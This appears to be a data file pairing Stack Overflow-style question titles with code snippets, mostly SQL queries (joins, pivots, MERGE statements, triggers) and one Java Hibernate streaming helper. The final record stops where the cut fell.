25612,48766,Get Values From SQL Table,"select flight_start.flno, flight_start.froma, flight_end.toa 
from flightleg flight_start
join flightleg flight_end on flight_start.flno = flight_end.flno
join (
  select 
    flno,
    min(seq) origin,
    max(seq) destination
  from flightleg
  group by flno
  having count(*) > 2
) min_max_seq
 on flight_start.flno = min_max_seq.flno 
and flight_start.seq  = min_max_seq.origin
and flight_end.seq    = min_max_seq.destination
"
291,52260,Delete records not present in join,"DELETE FROM A WHERE NOT EXISTS (SELECT * FROM B WHERE A.id = B.id)
"
39334,20334,how to record both success and fail in SQL Server Agent Job,"* When the job succeeds to notify the operator when the job completes successfully.
* When the job fails to notify the operator when the job completes unsuccessfully.
* When the job completes to notify the operator regardless of completion status.
"
29878,63302,Limit results of one column,"SELECT r.name AS region_name, c.name AS city_name, c.population AS population
FROM region r INNER JOIN 
     county c
     ON r.code = c.region_code
WHERE 5 >= (SELECT count(*)
            FROM county c2
            WHERE c2.region_code = c.region_code and c2.population >= c.population
           )
ORDER BY region, population DESC;
"
39225,59670,Straddle Query Results Instead of Stacking Duplicate Values,"SELECT ORDER_ID, ORDER_AMOUNT,
     LISTAGG(ORDER_TEXT, ', ') WITHIN GROUP(ORDER BY ORDER_TEXT)
     AS orders
  FROM PS_PO_HDR
  GROUP BY ORDER_ID, ORDER_AMOUNT
"
15905,58112,selecting entire table when selecting columns - How,"select col1,
       col4,
       col7,
       Table1.*,
       col9 
from (joined tables including Table1)
"
1473,15752,Update TAG Relational table from select match on main table with keywords field and tag table with individual keywords,"Insert into TagSoftarerel (SoftwareID, TagID)
Select m.Id, 
       (Select T.TagId from Tag T where T.Tag = m.Keyword) as TagId 
from MAIN m 
"
30478,14733,How to compare values which may both be null is T-SQL,"IF      EXISTS
        (
        SELECT  MY_FIELD1, MY_FIELD2, MY_FIELD3, MY_FIELD4, MY_FIELD5, MY_FIELD6
        FROM    MY_TABLE
        INTERSECT
        SELECT  @IN_MY_FIELD1, @IN_MY_FIELD2, @IN_MY_FIELD3, @IN_MY_FIELD4, @IN_MY_FIELD5, @IN_MY_FIELD6
        )
BEGIN
        goto on_duplicate
END
"
28885,41808,Converting a SELECT with 2 JOINS and a COUNT into an UPDATE Statement,"create table #prods (prod_id int PRIMARY KEY, prod_grp_id int)
create table #prod_grps (acct_grp_id int PRIMARY KEY, prod_grp_mgr_nm varchar(200))
create table #prod_grp_prods (prod_id int , prod_grp_id int)

-- insert testing data
insert into #prods values (1, null), (2,null), (3, null)
insert into #prod_grps values (999, 'AssMGR_Bill'), (998, 'LeadMGR_Jake'), (995, 'LeadMGR_Jake')
insert into #prod_grp_prods values (1, 999), (2, 995), (3, 999), (1,998)

-- original query
SELECT p.prod_id, pgp.prod_grp_id
    FROM #prods p
    INNER JOIN #prod_grp_prods pgp
    ON p.prod_id = pgp.prod_id
    INNER JOIN #prod_grps pg
    ON pgp.prod_grp_id = pg.acct_grp_id
    WHERE pg.prod_grp_mgr_nm LIKE '%LeadMGR%'
    GROUP BY p.prod_id , pgp.prod_grp_id
    HAVING COUNT(p.prod_id) = 1
    ORDER BY p.prod_id

-- update query
update #prods set prod_grp_id = t.prod_grp_id
from 
(
  SELECT p.prod_id, pgp.prod_grp_id
    FROM #prods p
    INNER JOIN #prod_grp_prods pgp
    ON p.prod_id = pgp.prod_id
    INNER JOIN #prod_grps pg
    ON pgp.prod_grp_id = pg.acct_grp_id
    WHERE pg.prod_grp_mgr_nm LIKE '%LeadMGR%'
    GROUP BY p.prod_id , pgp.prod_grp_id
    HAVING COUNT(p.prod_id) = 1

)t  
where t.prod_id = #prods.prod_id

-- view results
select * from #prods
"
20750,43264,rpad doest work correctly,"select replace(regexp_replace(COMERCIO,'[^[:print:]]', '!ACK!'),' ','.') as CAT_VET
from SIEBEL.transacciones_acumulaciones
where   ESTADO  = 'Procesado'
AND NUMERO in ( '20232385',
  '20225479', 
  '20265516');
"
23712,10021,Calculating Conversion Rate In MySQL,"(100 * SUM(click1) / SUM(`unique`))
"
34376,52593,Break SQL results by number,"select t1.item, qty / qty as qty
from yourtable t1
left join
(
  select rownum rn, item
  from yourtable
) t2
  on t1.qty >= t2.rn
order by t1.item
"
3097,48081,Get rows product (multiplication),"SELECT 
    CASE WHEN EXISTS (SELECT 1 FROM test WHERE <condition> AND datasign = 0)
         THEN 0
         ELSE (SELECT 1-2*(SUM(datasign=-1)%2) FROM test WHERE <condition>)
    END AS resultsign,

    CASE WHEN EXISTS (SELECT 1 FROM test WHERE <condition> AND datasign = 0)
         THEN -1            -- undefined log for result 0
         ELSE (SELECT SUM(datalog) FROM test WHERE <condition> AND datasign <> 0)
    END AS resultlog
  ;
"
35368,63673,SQL - Which data type represents percentages well?,"decimal(x,y)
"
22807,65622,SQL query contains IF / ELSE statement,"MERGE Production.UnitMeasure AS target
USING (SELECT @UnitMeasureCode, @Name) AS source (UnitMeasureCode, Name)
ON (target.UnitMeasureCode = source.UnitMeasureCode)
WHEN MATCHED THEN 
    UPDATE SET Name = source.Name
WHEN NOT MATCHED THEN   
    INSERT (UnitMeasureCode, Name)
    VALUES (source.UnitMeasureCode, source.Name)
    OUTPUT deleted.*, $action, inserted.* INTO #MyTempTable
"
19075,65373,CASE in an update,"   UPDATE table SET 
   col2 = ( if ( col1 <> 0 AND col2 = 0 ) ,val2 , if ((col1 = 0 and col2 <> 0) , col2 , if ((col1 = 0 and col2 = 0) , val1 , col2)) ),  
   col1 = ( if ( col1 = 0  and col2 <> 0) , val2 , if ((col1 <> 0 and col2 = 0) , col1 , (if (col1 = 0 and col2 = 0),val1 , col1 )) )
"
29369,55206,How to compare Column data and replace text using SQL Query,"UPDATE t1
 SET Column1 = [1],
     Column2 = [2]
FROM #table1 t1
CROSS APPLY
(
SELECT *
FROM
(
SELECT  DENSE_Rank() OVER (ORDER BY MIN(Idx)) AS Rnk, 
        ColumnValue
FROM
(
VALUES(1, Column1),(2, Column2)) V(Idx, ColumnValue)
WHERE ColumnValue IS NOT NULL
GROUP BY ColumnValue
) D
PIVOT (MAX(ColumnValue) FOR Rnk IN ([1], [2])) AS P
) ca
"
9438,42173,sql stored procedure single quotes,"set @query = 'select * from table1 when RECORD_FLAG <> ''t'' 
then Convert(Decimal(10,4),ISNULL(T.HISTORY_PCR ,0))  else ''0''';
"
28127,5766,Remove rows with the same value in specific column from Datagridview.,"SELECT *
FROM dbo.yourTable t
WHERE EXISTS (         
              SELECT 1
              FROM dbo.yourTable t2
              WHERE t2.Column3 = t.Column3
              HAVING COUNT(*) = 1
              )
"
22643,22441,How to use If condition inside a Case statement?,"select case 
  when value in (1000) then null
  when user in ('ABC') then user
  when area in ('DENVER') then
    case when value = 2000 then 'Service1'
         when value = 3000 then 'Service2'
    end 
  else null
  end as num_code 
from service_usoc_ref;
"
25317,15596,List all distinct values of column and their count,"select text_column, count(*) from text_table group by text_column
"
38982,54822,How to Find the Last Week's Most Sold Books in SQL,"SELECT top 10 b.bookID, COUNT(b.bookID) 
FROM TbSoldBooks b  
GROUP BY b.bookID
Where SaleDate >= DateAdd(day, -7, getDate()) -- last week
Order by 2 desc

SELECT top 10 b.bookID, COUNT(b.bookID) 
FROM TbSoldBooks b  
GROUP BY b.bookID
Where SaleDate >= DateAdd(month, -1, getDate()) -- last month
Order by 2 desc
"
19848,12686,SQL Sum Column before inserting into #temp,"SUM(AvgPrice *
     CASE
          WHEN ReservedQty > QtyOnHand THEN QtyOnHand
          ELSE ReservedQty
     END)
"
8213,48833,Oracle SQL for Comparing numerical values in the same column,"select ""TABLE"", ""PERIOD"", ""COUNTRY"", ""CODE"", ""POSITION"", to_char(Oct_14) Oct_14 , To_Char(Nov_14) Nov_14, To_Char(Dec_14) Dec_14  from Table1
union 
select 'COMPARE', '','', NULL, '',
(select 'ATTN' from dual where EXISTS (select 1 from Table1 where ""TABLE"" = 'TABLE_3' and OCT_14 > ALL(SELECT OCT_14 FROM Table1 WHERE ""TABLE"" IN ('TABLE_1','TABLE_2')))) Oct_14_Res,
(select 'ATTN' from dual where EXISTS (select 1 from Table1 where ""TABLE"" = 'TABLE_3' and Nov_14 > ALL(SELECT Nov_14 FROM Table1 WHERE ""TABLE"" IN ('TABLE_1','TABLE_2')))) Nov_14_Res,
(select 'ATTN' from dual where EXISTS (select 1 from Table1 where ""TABLE"" = 'TABLE_3' and Dec_14 > ALL(SELECT Dec_14 FROM Table1 WHERE ""TABLE"" IN ('TABLE_1','TABLE_2')))) Dec_14_Res
FROM dual;
"
32128,37956,sql query for select statement,"SELECT * FROM stock
UNION ALL
SELECT * FROM stock_history
WHERE ...
"
27675,1627,Using SQL or PL/SQL to replace empty lines before start of content in CLOB,"SELECT LTRIM (clob_field, CHR (10) || CHR (13) || ' ') FROM yourtable;
"
499,39366,setting up unique constraint on referenced collumns in oracle 10g xe,"CREATE UNIQUE INDEX unqIndex
    ON CompetitionsLanguages(CompetitionsLanguages, CompetitionsLanguages);
"
7494,68518,Way to improve this multiple UNION query?,"SELECT DISTINCT p.profile_id 
FROM productions_productionmember p
left outer join groups_groupmember g on g.profile_id = p.profile_id
left outer join videos_videocredit v on v.profile_id = p.profile_id
WHERE v.video_id is not null or g.group_id is not null
or p.production_id in (SELECT production_id 
                     FROM productions_productionmember 
                     WHERE profile_id=?)
"
16001,71918,Multiple Login area,"tbl_user
 UserID | firstName | Email | Password | LoginArea | GroupID

 1 , Bill , email@email1.com , passwordhash344, Backend | 2
 2 , Paul , email@email2.com , passwordhash123, Backend | 3 
"
20475,66130,How to create WHERE condition with tuples,"SELECT user_id
FROM ""user"" U join org_cat on U.company_id = org_cat.company_id 
AND U.subcompany_id = org_cat.subcompany_id 
WHERE org_cat.cat_id = 2
"
4054,16902,How to write this query to join output of two queries,"select *
from
 (
   select sourceid 
   from audittraillogentry 
   where event ='67' and innodename like '%_collector'
 ) as t1
join
 (
   select  destinationid 
   from audittraillogentry 
   where event ='68' 
     and (outnodename like '%_distributer' or outnodename like '%_Arch')
 ) as t2
 on t2.destinationid like t1.sourceid || '%'
"
25155,72808,Oracle SQL: Update a column from select,"merge into
  ETL_SOURCE_FILE_INST i
using
  (
    SELECT /*+ no_index(rh FILEINS_STATUS_FK_I) */
rh.SRCFILE_ID, rh.FILEINS_RECORD_COUNT, rh.FILEINS_EFFECTIVE_DATE,       esf.SRCFILE_FULL_COUNT_HIGH,
100*(rh.FILEINS_RECORD_COUNT/esf.SRCFILE_FULL_COUNT_HIGH) as PROCENTA,
CASE 
WHEN (100*(rh.FILEINS_RECORD_COUNT/esf.SRCFILE_FULL_COUNT_HIGH)) >= 80 
THEN FILEINS_RECORD_COUNT*1.25 
ELSE SRCFILE_FULL_COUNT_HIGH 
END AS NOVA_HODNOTA
FROM ETL_SOURCE_FILE_INST rh,
(SELECT MAX(FILEINS_EFFECTIVE_DATE) AS maxdate, SRCFILE_ID
FROM ETL_SOURCE_FILE_INST
GROUP BY SRCFILE_ID) maxresults,
ETL_SOURCE_FILES esf
WHERE rh.SRCFILE_ID = maxresults.SRCFILE_ID
and rh.SRCFILE_ID = esf.SRCFILE_ID
AND rh.FILEINS_EFFECTIVE_DATE= maxresults.maxdate
AND RH.FILEINS_INCREMENTAL_FLAG = 'F'
and ESF.SRCFILE_FULL_COUNT_FLAG = 'Y'
and RH.FILEINS_STATUS = 'COMPLETE'
  ) t on (t.SRCFILE_ID = i.SRCFILE_ID)
when matched then
update
set
  i.SRCFILE_FULL_COUNT_HIGH = t.NOVA_HODNOTA
where
  i.SRCFILE_FULL_COUNT_HIGH = t.SRCFILE_FULL_COUNT_HIGH
;
"
28178,46339,Where do I put the where clause in this query to filter results?,"SELECT m.MapName, SEC_TO_TIME(TRUNCATE(t.Time,3)) AS Time, p.User
FROM times t 
INNER JOIN maps m ON t.MapID = m.MapID 
INNER JOIN players p ON p.PlayerID = t.PlayerID
INNER JOIN (SELECT t.MapId, MIN(t.time) as time
            FROM times t
            WHERE t.style = 0 and t.type = 0 
            GROUP BY t.MapId
          ) tmin ON tmin.MapId = t.MapId and tmin.time = t.time;
"
31978,41733,Mysql need to select range of rows based on two columns values,"create temporary table clickinfo (date1 varchar(50), hour1 varchar(50), click int);

insert into clickinfo (date1, hour1, click) values
('2015-02-27'    ,'00',        7)
,('2015-02-27'    ,'01',        7)
,('2015-02-27'    ,'05',        7)
,('2016-02-27'    ,'02',        7)
,('2016-02-27'    ,'02',        8)
,('2016-02-27'    ,'03',        7)
,('2016-02-27'    ,'04',        9)
,('2016-02-27'    ,'05',        9);


select
  date_add(date1 ,  interval hour1 hour), sum(click) from clickinfo
where
  date_add(date1 ,  interval hour1 hour)
      between str_to_date('2015-02-27 5:0', '%Y-%m-%d %H:%i')
              and str_to_date('2016-02-28 23:0', '%Y-%m-%d %H:%i')
group by
  date_add(date1 ,  interval hour1 hour);
"
22733,731,Oracle SQL - Group by one column and list results in another,"WITH t(wk, COST) AS
(
SELECT 17,  446 FROM dual
UNION 
SELECT 18,  446 FROM dual
UNION 
SELECT 19,  446 FROM dual
UNION 
SELECT 26,  588 FROM dual
UNION 
SELECT 27,  588 FROM dual
UNION 
SELECT 28,  588 FROM dual
)
SELECT listagg(wk,',') WITHIN GROUP(ORDER BY wk) AS wks, COST 
FROM   t
GROUP BY COST;
"
18798,57333,How do I iterate over JPA query results without retaining them all in memory?,"import javax.persistence.EntityManager;

import java.util.Map;

import org.apache.log4j.Logger;
import org.hibernate.*;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

@Service
public class StatelessQueryRunner
{
    /** Executes specified native sql in a stateless session. The consumer is given each row as it's received. */
    @Transactional(readOnly = true, propagation = Propagation.REQUIRES_NEW)
    public <T> long run(EntityManager em, String sql, Class<T> resultRowType, Map<String,Object> params, int fetchSize, Integer firstResult, Integer maxResults, QueryResultConsumer<T> consumer) {
        int totalResults = 0;
        Session hibernateSession = em.unwrap(Session.class);
        StatelessSession statelessSession = hibernateSession.getSessionFactory().openStatelessSession();
        try {
            // create the query for the stateless session.
            SQLQuery q = statelessSession.createSQLQuery(sql);
            q.addEntity(resultRowType);

            q.setFetchSize(1000);
            JpaQueryWrapper qw = new JpaQueryWrapper(q);
            if(params!=null) {
                for(Map.Entry<String,Object> entry : params.entrySet()) {
                    qw.setParameter(entry.getKey(),entry.getValue());
                }
            }

            if(firstResult!=null)
                q.setFirstResult(firstResult);
            if(maxResults!=null)
                q.setMaxResults(maxResults);


            ScrollableResults sr = q
                .setReadOnly(true)
                .setFetchSize(fetchSize)
                .setCacheable(false)
                .scroll(ScrollMode.FORWARD_ONLY);
            try {
                while(sr.next()) {
                    T obj = (T)sr.get(0);
                    em.detach(obj);
                    consumer.consume(obj);

                    ++totalResults;
//                    if(totalResults % 100000 == 0)
//                        Logger.getLogger(getClass()).debug(""totalResults=""+ totalResults);
                }
            } finally {
                if(sr!=null)
                    sr.close();
            }

            return totalResults;

        } finally {
            statelessSession.close();
        }
    }

    /** You can't use annotations to start transactions when inside a stateless session, so if you want to do anything you'll need to call this method to run code in a separate session which uses the Session object to start a transaction and save things. */
    public <T> void runInSession(EntityManager em, SessionRunnable<T> action) {
        Session hibernateSession = em.unwrap(Session.class);
        Session session = hibernateSession.getSessionFactory().openSession();
        try {
            action.run(session);
        } finally {
            session.close();
        }
    }


    public interface SessionRunnable<T>
    {
        public void run(Session session);
    }
}


import javax.persistence.*;
import java.util.*;

import org.hibernate.SQLQuery;

public class JpaQueryWrapper
    implements javax.persistence.Query
{
    private SQLQuery q;

    public JpaQueryWrapper(SQLQuery q) {
        this.q = q;
    }

    @Override
    public List getResultList() {throw new UnsupportedOperationException();}
    @Override
    public Object getSingleResult() {throw new UnsupportedOperationException();}
    @Override
    public int executeUpdate() {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setMaxResults(int maxResult) {throw new UnsupportedOperationException();}
    @Override
    public int getMaxResults() {throw new UnsupportedOperationException();}
    @Override
    public Query setFirstResult(int startPosition) {throw new UnsupportedOperationException();}
    @Override
    public int getFirstResult() {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setHint(String hintName, Object value) {throw new UnsupportedOperationException();}
    @Override
    public Map<String, Object> getHints() {throw new UnsupportedOperationException();}
    @Override
    public <T> javax.persistence.Query setParameter(Parameter<T> param, T value) {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setParameter(Parameter<Calendar> param, Calendar value, TemporalType temporalType) {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setParameter(Parameter<Date> param, Date value, TemporalType temporalType) {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setParameter(String name, Object value) {
        if(value instanceof Enum) {
            q.setParameter(name,((Enum) value).name());
        } else {
            q.setParameter(name,value);
        }
        return this;
    }
    @Override
    public javax.persistence.Query setParameter(String name, Calendar value, TemporalType temporalType) {return setParameter(name,(Date)(value==null?null:value.getTime()),temporalType);}
    @Override
    public javax.persistence.Query setParameter(String name, Date value, TemporalType temporalType) {
        if(temporalType==TemporalType.DATE)
            q.setDate(name,value);
        else if(temporalType==TemporalType.TIME)
            q.setTime(name,value);
        else if(temporalType==TemporalType.TIMESTAMP)
            q.setTimestamp(name,value);
        else
            throw new UnsupportedOperationException();
        return this;
    }
    @Override
    public javax.persistence.Query setParameter(int position, Object value) {q.setParameter(position,value); return this;}
    @Override
    public javax.persistence.Query setParameter(int position, Calendar value, TemporalType temporalType) {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setParameter(int position, Date value, TemporalType temporalType) {throw new UnsupportedOperationException();}
    @Override
    public Set<Parameter<?>> getParameters() {throw new UnsupportedOperationException();}
    @Override
    public Parameter<?> getParameter(String name) {throw new UnsupportedOperationException();}
    @Override
    public <T> Parameter<T> getParameter(String name, Class<T> type) {throw new UnsupportedOperationException();}
    @Override
    public Parameter<?> getParameter(int position) {throw new UnsupportedOperationException();}
    @Override
    public <T> Parameter<T> getParameter(int position, Class<T> type) {throw new UnsupportedOperationException();}
    @Override
    public boolean isBound(Parameter<?> param) {throw new UnsupportedOperationException();}
    @Override
    public <T> T getParameterValue(Parameter<T> param) {throw new UnsupportedOperationException();}
    @Override
    public Object getParameterValue(String name) {throw new UnsupportedOperationException();}
    @Override
    public Object getParameterValue(int position) {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setFlushMode(FlushModeType flushMode) {throw new UnsupportedOperationException();}
    @Override
    public FlushModeType getFlushMode() {throw new UnsupportedOperationException();}
    @Override
    public javax.persistence.Query setLockMode(LockModeType lockMode) {throw new UnsupportedOperationException();}
    @Override
    public LockModeType getLockMode() {throw new UnsupportedOperationException();}
    @Override
    public <T> T unwrap(Class <T> cls) {throw new UnsupportedOperationException();}
}


public interface QueryResultConsumer<T>
{
    public void consume(T obj);
}
"
15056,54929,Date Styles in MySQL,"STR_TO_DATE('12-DEC-78', ""%d-%b-%y"")
"
8033,48571,Oracle checking for existence of rows in a large table,"SELECT COUNT(*)
FROM   X
WHERE  id1 = :1 AND
       id2 = :2 AND
       ROWNUM = 1;
"
23662,52791,Check the length and add corresponding column,"SELECT 
CASE 
WHEN ((LEN(ID))<5) THEN (RTRIM(ID)+LTRIM(Code)) ELSE ID END AS ID
FROM tblID
ORDER BY ID DESC
"
22825,52360,how to display data from different tables column into one table column,"SELECT     Location =C.Location
           ,Customer =C.Customer
           ,Service =C.Service
           ,Location2=(SELECT B.Location FROM Table2 B  where     B.customerid=C.customerid)
    FROM   Customer C --  Use alais names 
"
8895,68098,MySQL sectioned ordering,"select * from yourtable
order by 
  boolean desc, 
  case when boolean = 0 then value else null end, -- ´else null´ is redundant
  case when boolean = 1 then name  else null end  -- but is here to clarify
"
2900,6498,Lock table while inserting,"BEGIN TRANSACTION t_Transaction

BEGIN TRY

TRUNCATE TABLE LargeTable

 INSERT INTO LargeTable
 SELECT * 
 FROM viewLargeView
  WITH (HOLDLOCK)


 COMMIT t_Transaction

END TRY 

BEGIN CATCH
  ROLLBACK t_Transaction
END CATCH
"
22714,42440,Oracle SQL - filter group by in AVG function,"SELECT product_name, sale_price, sale_date,
       SUM(CASE WHEN sales.sale_date = TO_DATE('14-JUN-14', 'DD-MON-YY') - 1 THEN (sale_price) ELSE 0 
           END) as sale_yday,
       SUM(CASE WHEN sales.sale_date = TO_DATE('14-JUN-14', 'DD-MON-YY') - 7 THEN (sale_price) ELSE 0 
           END) as sale_lweek,
       AVG(CASE WHEN sales.sale_date < TO_DATE('14-JUN-14', 'DD-MON-YY') - 1 THEN sales.sale_price
           END) as ten_wk_avg,
       STDDEV(CASE WHEN sales.sale_date < TO_DATE('14-JUN-14', 'DD-MON-YY') - 1 THEN sales.sale_price
              END) as ten_wk_stddev

. . .
"
27664,47580,Returning distinct rows using WHERE Exists(SELECT 1 FROM TABLE),"select r.*
from reads r
where exists (select 1
              from ExplodedPlates x
              where r.RowId = x.RowID and
                    x.Plate GLOB @Plate
             );
"
8329,25659,How to provide custom name to column in pivoting,"IF OBJECT_ID('tempdb..#t') IS NOT NULL
    DROP TABLE #t
GO

CREATE TABLE #t (
    id VARCHAR(10),
    unit VARCHAR(100)
)
INSERT INTO #t (id, unit)
VALUES
    ('1', 'kg'),
    ('2', 'cm'),
    ('3', 'mm'),
    ('4', 'mm')

DECLARE @SQL NVARCHAR(MAX), @columns NVARCHAR(MAX)

SELECT @columns = STUFF((
    SELECT ',[D' + id + ']'
    FROM #t
    FOR XML PATH('')), 1, 1, '')

SELECT @SQL =  '
    SELECT * 
    FROM (
        SELECT [unit], col = N''D'' + id
        FROM #t
    ) s 
    PIVOT (MAX(unit) FOR col IN (' + @columns + ')) p'

EXEC sys.sp_executesql @SQL
"
21252,14962,How do you add an edit button to each row in a report in Oracle APEX?,"SELECT '' edit_link, -- This is the new column
    ...
"
27018,8117,loops and conditionals inside triggers,"CREATE TABLE foo (id INT, bar_id INT,
    FOREIGN KEY (bar_id) REFERENCES bar(id)
        ON DELETE CASCADE
) ENGINE=INNODB;
"
15663,14871,Inserting default value as current date + 30 days in MySQL,"CREATE TRIGGER setDefaultDate
    BEFORE INSERT ON tableName
    FOR EACH ROW
    SET NEW.date = ADDDATE(curdate(), INTERVAL 30 DAY);
"
19695,33610,Is 20 MB generally enough for a blog database in SQL Server or MySQL?,"          D bytes per database
---------------------------------------  = weeks per database
(N posts per week) x (S bytes per post)
"
35086,39301,MySQL Query taking cartesian product,"select mp.convo_id, mm.id, mp.prof_id, mp.prof_type, mm.message, mm.time_cre
from msg_participants mp
join msg_messages mm on mp.id = mm.participant_id
where mp.prof_id = PROF_ID_HERE
and mp.prof_type = PROF_TYPE_HERE 
and not exists (
    select 1 from msg_messages mm2
    where mm2.participant_id = mm.participant_id
    and mm2.time_cre > mm.time_cre
) 
"
21501,60559,SQL 3 tables to join,"select * from (select t3.name,sum(t1.rental_rate) as rate from film as t1
inner join film_category as t2 on t1.film_id=t2.film_id
inner join category as t3 on t2.category_id=t3.category_id
group by t2.category_id) as detail order by rate DESC LIMIT 5
"
30166,73832,How to use an aggregate function on a sub-query,"SELECT 
    strat_id,
    MIN(ratio) ratio,
    root
FROM
    ratioPnltable
WHERE
    totalPnl IN (query)
GROUP BY
    strat_id,
    root
"
13077,52897,How to find Current open Cursors in Oracle,"select a.value, s.username, s.sid, s.serial#
from v$sesstat a, v$statname b, v$session s
where a.statistic# = b.statistic#  and s.sid=a.sid
and b.name = 'opened cursors current';
"
35593,59881,Merging columns from separate tables,"SELECT PlayerName, SUM(Field1) + SUM(Field2) AS Power, SUM(Field3) AS Weakness
FROM(SELECT t1.PlayerName, t2.Field1, t2.Field2, t3.Field3
     FROM 
     Plays t1,Creep t2,WeakCreep t3
     where 
     t1.Id = t2.Id and t1.Id = t3.Id
     GROUP BY t1.PlayerName, t2.Field1, t2.Field2, t3.Field3)
     GROUP BY PlayerName;
"
12772,33623,Retrieving multiple xml child node values,"select (
       select ' '+X.N.value('text()[1]', 'varchar(max)')
       from (select cast(T.XMLCol as xml)) as T1(XMLCol)
         cross apply T1.XMLCol.nodes('//*') as X(N)
       for xml path(''), type
       ).value('substring(text()[1], 2)', 'varchar(max)')
from T
"
29144,18238,SQL - return data from a column using 2 different IDs,"SELECT users.user_id, friends.user_id AS friend_user_id ...
"
8671,34195,Retrieve client ip address in mysql,"select host from information_schema.processlist WHERE ID=connection_id();
"
30016,16905,MySQL slug function on insert,"CREATE TABLE people
(`name` varchar(128), `slug` varchar(128));

-- It's not a real function it's just an oversimplified example
-- you need to implement your own logic     
CREATE FUNCTION NAME_SLUG(name VARCHAR(128))
RETURNS VARCHAR(128)
  RETURN LOWER(REPLACE(name, ' ', '-'));

CREATE TRIGGER tg_people_insert
BEFORE INSERT ON people
FOR EACH ROW
  SET NEW.slug = NAME_SLUG(NEW.name);

INSERT INTO people (`name`)
VALUES ('Jhon Doe'),('Ian Martin Louis'), ('Mark Lee');

SELECT * FROM people;
"
17072,19794,Exporting SQL Server data (fixed length) to an SFTP server on a daily basis,"bcp database.dbo.table out datafile.csv -c -t, -T
"
24138,38064,plsql code to replace values of a column with characters,"select name,substr(lpad(name,length(name)+length(name),'X'),1,length(name)) as replaced_name from table
"
29648,25025,Trouble with script getting last action using nested queries,"SELECT
O.ORDER_NUMBER
,LAST_ID
,FINISH_ID
,LAST_ID
INTO #TEMP1
--,*
FROM [CUSTOMER] [C]
JOIN [SITE] [S] ON C.CUSTOMER_ID=S.CUSTOMER_ID
JOIN [ORDER] [O] ON S.SITE_ID=O.SITE_ID
JOIN [ITEM] [I] ON O.ORDER_ID=I.ORDER_ID
JOIN (SELECT
    MAX(ACTION_ID) AS [START_ID], A2.ITEM_ID
    FROM [ACTION] [A2]
    JOIN [ALLOWED_ACTION] [AA2] ON A2.ALLOWED_ACTION_ID = AA2.ALLOWED_ACTION_ID
    WHERE AA2.DESCRIPTION='START'
    GROUP BY A2.ITEM_ID) AS [D] ON I.ITEM_ID=D.ITEM_ID
JOIN (SELECT
    MAX(ACTION_ID) AS [FINISH_ID], A3.ITEM_ID
    FROM [ACTION] [A3]
    JOIN [ALLOWED_ACTION] [AA3] ON A3.ALLOWED_ACTION_ID = AA3.ALLOWED_ACTION_ID
    WHERE AA3.DESCRIPTION='FINISH'
    GROUP BY A3.ITEM_ID) AS [F] ON I.ITEM_ID=F.ITEM_ID
JOIN (SELECT
    MAX(ACTION_ID) AS [LAST_ID], A4.ITEM_ID
    FROM [ACTION] [A4]
    GROUP BY A4.ITEM_ID) AS [L] ON I.ITEM_ID=L.ITEM_ID

SELECT ORDER_NUMBER FROM #TEMP1
WHERE LAST_ID>FINISH_ID
AND 
FINISH_ID>START_ID
"
951,41934,How To: Count widgets sold every 7 days for a period of a year,"SELECT 
     DATEPART(week, w.CreateTS) AS [SoldWeek]
    ,COUNT(*) AS NumberOfWidgets
    ,FT.FormName
FROM tblWidget W
JOIN tblFormType FT ON (W.FormTypeID = FT.FormTypeID)
WHERE W.CreateTS >= DATEADD(YEAR, -1, @RunDate)
GROUP BY DATEPART(week, w.CreateTS), FT.FormName
"
1128,2659,Partially Circular Join,"--you orginal rs
SELECT A.Claim_Nbr, A.Column_2, A.Column_3, B.P_Claim_Nbr
  FROM Table_A A
  JOIN Table_B B ON A.Claim_Nbr = B.Claim_Nbr

UNION --get only distinct values from the combined result sets

--plus all the records form the next level deep.
SELECT A2.Claim_Nbr, A2.Column_2, A2.Column_3, NULL
  FROM Table_A A
  JOIN Table_B B on A.Claim_Nbr = B.Claim_Nbr 
  JOIN TABLE_A A2 ON B.P_Claim_Nbr = A2.Claim_Nbr
"
26205,2905,Get column of a mysql entry," SELECT @m := GREATEST(col1, col2), 
 CASE @m 
      WHEN col1 THEN 'col1' 
      WHEN col2 THEN 'col2' 
 END 
 FROM my_table
"
13111,54831,How to split a String and compare with a Column that String is present or not in mysql,"SELECT *, skillset FROM tresume_mas WHERE skillset REGEXP '.NET Framework|JAVA J2EE';
"
31386,10723,What characters are allowed in Oracle bind param placeholders?,"create or replace function F0416B
RETURN VARCHAR2
is
    V_STMT    VARCHAR2(1999);
    V_RESULT  VARCHAR2(1999);
BEGIN 
    V_STMT := 'INSERT INTO TEST0411(FIELD1, FIELD2) VALUES ( :""A.1"" , :""A.2"")';
    EXECUTE IMMEDIATE V_STMT USING  'AS201', 'AS202';
    RETURN 'INSERT-OK';
    COMMIT;
EXCEPTION
WHEN OTHERS THEN RETURN SQLERRM;
END;    
"
14376,30808,Selecting rows whose foreign rows ONLY match a single value," select people.person_id, people.name 
   from people 
   join pets on people.person_id = pets.person_id 
  where pets.animal = ""tiger"" 
    AND people.person_id NOT IN (select person_id from pets where animal != 'tiger');
"
5900,47871,SQL query showing element more than once,"select c.name, count(c.title) as numfilms
from casting c
Group by c.name
Having count (c.title) > 1
order by numfilms
"
35268,44881,Pivot the columns in SQL Server,"SELECT 
  LEFT(measure, CHARINDEX('_', measure)-1) AS Measure,
  LEFT(measure, CHARINDEX('_', measure)-1) + '_A1' AS Measure_A1, --Not sure you need this
  SUM(CASE WHEN RIGHT(measure,2) = 'A1' THEN YTD ELSE 0 END) AS YTD_A1,
  SUM(CASE WHEN RIGHT(measure,2) = 'A1' THEN Q1 ELSE 0 END) AS Q1_A1,
  SUM(CASE WHEN RIGHT(measure,2) = 'A1' THEN Q2 ELSE 0 END) AS Q2_A1,
  LEFT(measure, CHARINDEX('_', measure)-1) + '_A2' AS Measure_A2, --Not sure you need this
  SUM(CASE WHEN RIGHT(measure,2) = 'A2' THEN YTD ELSE 0 END) AS YTD_A2,
  SUM(CASE WHEN RIGHT(measure,2) = 'A2' THEN Q1 ELSE 0 END) AS Q1_A2,
  SUM(CASE WHEN RIGHT(measure,2) = 'A2' THEN Q2 ELSE 0 END) AS Q2_A2
FROM Structure
